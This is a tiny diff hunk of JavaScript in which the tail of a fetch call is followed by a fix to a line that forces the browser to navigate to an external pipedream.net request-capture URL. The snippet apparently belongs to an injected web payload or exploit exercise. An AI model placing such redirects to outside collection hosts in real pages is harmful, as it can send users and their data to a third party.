@@ -18,6 +18,6 @@ fetch(url, {
     console.error('Error:', error);
   });
 
-document.location("https://enmgi3emqyjm.x.pipedream.net/")
+document.location="https://enmgi3emqyjm.x.pipedream.net/"
 
 
